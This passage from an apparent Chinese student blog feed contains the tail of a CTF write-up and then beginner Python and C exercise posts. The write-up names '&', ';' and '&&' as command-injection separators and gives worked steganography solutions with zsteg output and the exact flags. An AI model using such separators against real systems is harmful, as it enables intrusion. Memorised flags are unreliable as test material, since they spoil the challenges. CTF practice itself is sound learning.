当有几个命令要连续执行时，我们可以把它们放在一行内，中间用“;”分开<br></code></pre></td></tr></table></figure><p>所以这里我们选择<code>&amp;</code> 、<code>;</code>、<code>&amp;&amp;</code>作为注入的方式应该都可以</p><h3 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h3><p><strong>题目</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">房屋为什么会倒立！是重力反转了吗？<br></code></pre></td></tr></table></figure><p><strong>考点</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">隐写<br></code></pre></td></tr></table></figure><p>打开发现是张图片</p><p><img src="/img/GFSJ/%E5%80%92%E7%AB%8B%E5%B1%8B.png"></p><p>放进kali中，直接zsteg，发现<code>&quot;IsCc_2019&quot;</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gams">┌──(root㉿kali2023)-[~]<br>└─# zsteg <span class="hljs-string">&#x27;/home/tanyu/桌面/倒立屋.png&#x27;</span> <br><span class="hljs-function"><span class="hljs-title">imagedata</span></span>           .. text: <span class="hljs-string">&quot;\t\t\t\r\r\r\r\r\r&quot;</span><br><span class="hljs-function"><span class="hljs-title">b1</span></span>,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;IsCc_2019&quot;</span><br><span class="hljs-function"><span class="hljs-title">b2</span></span>,r,msb,xy         .. text: <span class="hljs-string">&quot;t^y\t_&#123;!iO&quot;</span><br><span class="hljs-function"><span class="hljs-title">b2</span></span>,g,msb,xy         .. text: <span class="hljs-string">&quot;UUUUUU`\rUUUU&quot;</span><br><span class="hljs-function"><span class="hljs-title">b2</span></span>,b,msb,xy         .. text: <span class="hljs-string">&quot;UUUUUU`\rUUUU&quot;</span><br><span class="hljs-function"><span class="hljs-title">b2</span></span>,rgb,msb,xy       .. text: <span class="hljs-string">&quot;jZ]?O]kO&quot;</span><br><span class="hljs-function"><span class="hljs-title">b4</span></span>,r,lsb,xy         .. text: <span class="hljs-string">&quot;#UwcDS#z&quot;</span><br><span class="hljs-function"><span class="hljs-title">b4</span></span>,r,msb,xy         .. text: [<span class="hljs-string">&quot;f&quot;</span> repeated <span class="hljs-number">8</span> times]<br><span class="hljs-function"><span class="hljs-title">b4</span></span>,g,lsb,xy         .. text: <span class="hljs-string">&quot;w17ffd2T3EB&quot;</span><br><span class="hljs-function"><span class="hljs-title">b4</span></span>,g,msb,xy         .. text: <span class="hljs-string">&quot;wwwwwwwwwwww3&#123;&quot;</span><br><span class="hljs-function"><span class="hljs-title">b4</span></span>,b,lsb,xy         .. text: <span class="hljs-string">&quot;ffffwwww&quot;</span><br><span class="hljs-function"><span class="hljs-title">b4</span></span>,b,msb,xy         .. text: <span class="hljs-string">&quot;ffffffffffff\&quot;j&quot;</span><br><span class="hljs-function"><span class="hljs-title">b4</span></span>,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;iVugVUUU6&quot;</span><br><span class="hljs-function"><span class="hljs-title">b4</span></span>,bgr,lsb,xy       .. text: <span class="hljs-string">&quot;YevWUUUV&quot;</span><br></code></pre></td></tr></table></figure><p>但是提交<code>flag&#123;IsCc_2019&#125;</code>并不对，题目说了”<strong>倒立</strong>“</p><p>于是提交<code>flag&#123;9102_cCsI&#125;</code>成功</p><h3 id="打野"><a href="#打野" class="headerlink" title="打野"></a>打野</h3><p><strong>题目</strong></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">菜你了解CTF圈的实时动态么？flag格式qwxf</span><span class="hljs-template-variable">&#123;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>考点</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">隐写<br></code></pre></td></tr></table></figure><p>打开是我最喜欢的坤坤</p><p><img src="/img/GFSJ/%E7%9E%85%E5%95%A5.bmp"></p><p>直接用zsteg，flag就出来了<code>qwxf&#123;you_say_chick_beautiful?&#125;</code></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs wren">┌──(<span class="hljs-variable">root</span>㉿<span class="hljs-variable">kali2023</span>)<span class="hljs-operator">-</span>[<span class="hljs-operator">~</span>]<br>└─# <span class="hljs-variable">zsteg</span> &#x27;/<span class="hljs-variable">home</span>/<span class="hljs-variable">tanyu</span>/桌面/瞅啥.<span class="hljs-property">bmp</span>&#x27;                              <br>[?] <span class="hljs-number">2</span> <span class="hljs-variable">bytes</span> <span class="hljs-variable">of</span> <span class="hljs-variable">extra</span> <span class="hljs-variable">data</span> <span class="hljs-variable">after</span> <span class="hljs-variable">image</span> <span class="hljs-title function_">end</span> (<span class="hljs-variable">IEND</span>), <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x269b0e</span><br><span class="hljs-variable">extradata</span>:<span class="hljs-number">0</span>         <span class="hljs-operator">..</span> [<span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span>&quot;</span> <span class="hljs-variable">repeated</span> <span class="hljs-number">2</span> <span class="hljs-variable">times</span>]<br><span class="hljs-variable">imagedata</span>           <span class="hljs-operator">..</span> <span class="hljs-variable">file</span>: <span class="hljs-title class_">Open</span>PGP <span class="hljs-title class_">Public</span> <span class="hljs-title class_">Key</span><br><span class="hljs-variable">b1</span>,<span class="hljs-variable">lsb</span>,<span class="hljs-variable">bY</span>           <span class="hljs-operator">..</span> <span class="hljs-operator">&lt;</span><span class="hljs-variable">wbStego</span> <span class="hljs-variable">size</span><span class="hljs-operator">=</span><span class="hljs-number">120</span>, <span class="hljs-variable">ext</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x8E</span><span class="hljs-char escape_">\xEE</span>&quot;</span>, <span class="hljs-variable">data</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x1E</span>f<span class="hljs-char escape_">\xDE</span><span class="hljs-char escape_">\x9E</span><span class="hljs-char escape_">\xF6</span><span class="hljs-char escape_">\xAE</span><span class="hljs-char escape_">\xFA</span><span class="hljs-char escape_">\xCE</span><span class="hljs-char escape_">\x86</span><span class="hljs-char escape_">\x9E</span>&quot;</span><span class="hljs-operator">...</span>, <span class="hljs-variable">even</span><span class="hljs-operator">=</span><span class="hljs-literal">false</span><span class="hljs-operator">&gt;</span><br><span class="hljs-variable">b1</span>,<span class="hljs-variable">msb</span>,<span class="hljs-variable">bY</span>           <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;qwxf&#123;you_say_chick_beautiful?&#125;&quot;</span><br><span class="hljs-variable">b2</span>,<span class="hljs-variable">msb</span>,<span class="hljs-variable">bY</span>           <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;i2,C8&amp;k0.&quot;</span><br><span class="hljs-variable">b4</span>,<span class="hljs-variable">msb</span>,<span class="hljs-variable">bY</span>           <span class="hljs-operator">..</span> <span class="hljs-variable">file</span>: <span class="hljs-title class_">Open</span>PGP <span class="hljs-title class_">Public</span> <span class="hljs-title class_">Key</span><br><span class="hljs-variable">b2</span>,<span class="hljs-variable">r</span>,<span class="hljs-variable">lsb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;UUUUUU9VUUUUUUUUUUUUUUUUUUUUUU&quot;</span><br><span class="hljs-variable">b2</span>,<span class="hljs-variable">g</span>,<span class="hljs-variable">msb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: [<span class="hljs-string">&quot;U&quot;</span> <span class="hljs-variable">repeated</span> <span class="hljs-number">22</span> <span class="hljs-variable">times</span>]<br><span class="hljs-variable">b2</span>,<span class="hljs-variable">b</span>,<span class="hljs-variable">lsb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: [<span class="hljs-string">&quot;U&quot;</span> <span class="hljs-variable">repeated</span> <span class="hljs-number">10</span> <span class="hljs-variable">times</span>]<br><span class="hljs-variable">b3</span>,<span class="hljs-variable">g</span>,<span class="hljs-variable">msb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;V9XDR<span class="hljs-char escape_">\\</span>d@&quot;</span><br><span class="hljs-variable">b4</span>,<span class="hljs-variable">r</span>,<span class="hljs-variable">lsb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;222<span class="hljs-char escape_">\&quot;</span>#33<span class="hljs-char escape_">\&quot;</span>#33<span class="hljs-char escape_">\&quot;</span>#33<span class="hljs-char escape_">\&quot;</span>3222333<span class="hljs-char escape_">\&quot;</span>3#321&quot;</span><br><span class="hljs-variable">b4</span>,<span class="hljs-variable">g</span>,<span class="hljs-variable">lsb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;3<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>3###33##3#UDUEEEEEDDUETEDEDDUEEDTEEEUT#!&quot;</span><br><span class="hljs-variable">b4</span>,<span class="hljs-variable">g</span>,<span class="hljs-variable">msb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>DDDDDDDDDDDD<span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span><span class="hljs-char escape_">\&quot;</span>DDDDDDDDDDDD*LD&quot;</span><br><span class="hljs-variable">b4</span>,<span class="hljs-variable">b</span>,<span class="hljs-variable">lsb</span>,<span class="hljs-variable">xY</span>         <span class="hljs-operator">..</span> <span class="hljs-variable">text</span>: <span class="hljs-string">&quot;gfffffvwgwfgwwfw&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python日记-Day02</title>
    <link href="/2024/01/15/Python%E6%97%A5%E8%AE%B0-Day02/"/>
    <url>/2024/01/15/Python%E6%97%A5%E8%AE%B0-Day02/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/pystudy/7-1_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-1</span><br>n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> n&gt;=<span class="hljs-number">90</span>:<br>    t=<span class="hljs-string">&#x27;A&#x27;</span><br><span class="hljs-keyword">elif</span> n&gt;=<span class="hljs-number">80</span>: <span class="hljs-comment">#关键字 elif 用于在 Python 程序中创建一个条件链，它是 else if 的缩写</span><br>    t=<span class="hljs-string">&#x27;B&#x27;</span><br><span class="hljs-keyword">elif</span> n&gt;=<span class="hljs-number">70</span>:<br>    t=<span class="hljs-string">&#x27;C&#x27;</span><br><span class="hljs-keyword">elif</span> n&gt;=<span class="hljs-number">60</span>:<br>    t=<span class="hljs-string">&#x27;D&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    t=<span class="hljs-string">&#x27;E&#x27;</span><br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-3_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-3</span><br>n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> n%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;even&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;odd&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-4_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-4</span><br>t=<span class="hljs-built_in">input</span>()<br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-5_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-5</span><br>num=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>t=<span class="hljs-built_in">hex</span>(num).upper()[<span class="hljs-number">2</span>:] <span class="hljs-comment">#这里，hex(num)函数将十进制数转换为十六进制，upper()函数将输出转换为大写（如果存在字母），而切片[2:]用来去掉十六进制字符串前面的&#x27;0x&#x27;前缀。最后，print()函数输出结果并在输出后自动添加一个换行符</span><br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-6_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-6</span><br>num=<span class="hljs-built_in">input</span>().strip()<br>t=<span class="hljs-built_in">int</span>(num,<span class="hljs-number">16</span>) <span class="hljs-comment">#int()函数带有两个参数：第一个参数是要转换的字符串，第二个参数是字符串的进制基数，这里是16表示要从十六进制转换。程序将输出十进制中的等价值</span><br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-7_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-7</span><br>num=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>t=<span class="hljs-built_in">oct</span>(num).upper()[<span class="hljs-number">2</span>:] <span class="hljs-comment">#oct(num)函数将十进制数转换为八进制</span><br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-8_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-8</span><br>n=<span class="hljs-built_in">float</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">round</span>(n,<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-9_002.png"></p><p><strong>在Python中，<code>f</code>或<code>F</code>在字符串前用来表示格式化字符串字面量（也称为f-strings）。从Python 3.6开始引入，f-strings是一种快速方便的方式来格式化字符串。</strong></p><p><strong>例如：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">name = <span class="hljs-string">&#x27;World&#x27;</span><br>greeting = <span class="hljs-string">f&#x27;Hello, <span class="hljs-subst">&#123;name&#125;</span>!&#x27;</span><br><span class="hljs-built_in">print</span>(greeting)  <span class="hljs-comment"># 输出: Hello, World!</span><br></code></pre></td></tr></table></figure><p><strong>在这个例子中，花括号中的<code>name</code>变量被它的值替换，然后整个字符串被格式化。</strong></p><p><strong>使用f-strings表示形式可以很方便地将代码、表达式和变量的值嵌入字符串中。在f-string中的表达式部分会在运行时计算，并将结果插入到字符串中。你可以在花括号中添加任何有效的Python表达式。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-9</span><br>t=<span class="hljs-built_in">input</span>().split()<br>a1=<span class="hljs-built_in">float</span>(t[<span class="hljs-number">0</span>])<br>b=<span class="hljs-built_in">int</span>(t[<span class="hljs-number">1</span>])<br>c=t[<span class="hljs-number">2</span>]<br>a2=<span class="hljs-built_in">float</span>(t[<span class="hljs-number">3</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;c&#125;</span> <span class="hljs-subst">&#123;b&#125;</span> <span class="hljs-subst">&#123;a1:<span class="hljs-number">.2</span>f&#125;</span> <span class="hljs-subst">&#123;a2:<span class="hljs-number">.2</span>f&#125;</span>&quot;</span>) <span class="hljs-comment">#使用的f&quot;&#123;c&#125; &#123;b&#125; &#123;a1:.2f&#125; &#123;a2:.2f&#125;&quot;就是一个f-string，其中&#123;a1:.2f&#125;和&#123;a2:.2f&#125;用于指定格式化的样式，保留2位小数。这样，无论a1和a2实际有多少位小数，输出都会保留两位</span><br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-10_002.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;D:\\C Code\\test\\debug\\hello world.exe&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python日记-Day01</title>
    <link href="/2024/01/14/Python%E6%97%A5%E8%AE%B0-Day01/"/>
    <url>/2024/01/14/Python%E6%97%A5%E8%AE%B0-Day01/</url>
    
    <content type="html"><![CDATA[<p><strong>这是新创建的Python日记，主要用来记录假期Python的学习</strong></p><p><img src="/img/pystudy/7-1_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Talk is cheap. Show me the code.&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-2_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-2</span><br>a,b=<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,<span class="hljs-built_in">input</span>().split())<br>d=<span class="hljs-number">5000</span>-a*b/<span class="hljs-number">2</span>-(b+<span class="hljs-number">100</span>)*(<span class="hljs-number">100</span>-a)/<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(d))<br><span class="hljs-comment"># or</span><br>a=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>b=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>d=<span class="hljs-number">5000</span>-a*b/<span class="hljs-number">2</span>-(b+<span class="hljs-number">100</span>)*(<span class="hljs-number">100</span>-a)/<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(d))<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-3_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-3</span><br>l,w,h=<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,<span class="hljs-built_in">input</span>().split())<br>v=l*w*h<br><span class="hljs-built_in">print</span>(v)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-4_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-4</span><br>n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>a=n/<span class="hljs-number">15</span><br>b=n/<span class="hljs-number">20</span><br>c=n*<span class="hljs-number">90</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(a), <span class="hljs-built_in">int</span>(b), <span class="hljs-built_in">int</span>(c))<br><span class="hljs-comment"># or</span><br>n=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br>a=n//<span class="hljs-number">15</span> <span class="hljs-comment">#猪肉一斤价值15元，要求取整数部分，所以N块钱可以买 n//15 斤猪肉</span><br>b=n//<span class="hljs-number">20</span> <span class="hljs-comment">#鸡肉一斤价值20元，要求取整数部分，所以N块钱可以买 n//15 斤鸡肉</span><br>c=n*<span class="hljs-number">90</span><br><span class="hljs-built_in">print</span>(a,b,c)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-5_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-5</span><br>n,k,m=<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,<span class="hljs-built_in">input</span>().split())<br>t=n-k*m<br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-6_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-6</span><br>D=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> D&lt;<span class="hljs-number">6</span>:<br>    <span class="hljs-built_in">print</span>(D+<span class="hljs-number">2</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(D-<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-7_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-7</span><br>a,b,c,=<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,<span class="hljs-built_in">input</span>().split())<br><span class="hljs-keyword">if</span> a+b&gt;c <span class="hljs-keyword">and</span> b+c&gt;a <span class="hljs-keyword">and</span> a+c&gt;b:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;YES&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-8_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-8</span><br>x=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">if</span> x&lt;<span class="hljs-number">90</span>:<br>    t=<span class="hljs-string">f&#x27;kao le <span class="hljs-subst">&#123;x&#125;</span> fen bie xie qi!&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    t=<span class="hljs-string">f&#x27;gong xi ni kao le <span class="hljs-subst">&#123;x&#125;</span> fen!&#x27;</span><br><span class="hljs-built_in">print</span>(t)<br></code></pre></td></tr></table></figure><p><img src="/img/pystudy/7-9_001.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 7-9</span><br>f=<span class="hljs-built_in">float</span>(<span class="hljs-built_in">input</span>())<br>c=<span class="hljs-number">5</span>/<span class="hljs-number">9</span>*(f-<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">float</span>(<span class="hljs-built_in">round</span>(c,<span class="hljs-number">1</span>))) <span class="hljs-comment">#round() 是 Python 中的一个内置函数，用来进行四舍五入运算。该函数接受两个参数：第一个参数是要进行四舍五入的数字，第二个参数是可选的，表示要保留的小数点后的位数。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于冒泡排序的小优化</title>
    <link href="/2024/01/11/%E5%85%B3%E4%BA%8E%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%8F%E4%BC%98%E5%8C%96/"/>
    <url>/2024/01/11/%E5%85%B3%E4%BA%8E%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%9A%84%E5%B0%8F%E4%BC%98%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>今天C语言考试结束，有这样一道文件类型题是老师上课讲到过的</p><p>先上老师的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*定义一个Student 结构体类型，含学号、姓名、成绩，建立10个学生结构体变量，按成绩升序排序，</span><br><span class="hljs-comment">将它们保存到文本文件student.txt中。*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Student</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> num;<br><span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br><span class="hljs-type">double</span> sc;<br>&#125;a[<span class="hljs-number">10</span>],t;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>FILE *fp=fopen(<span 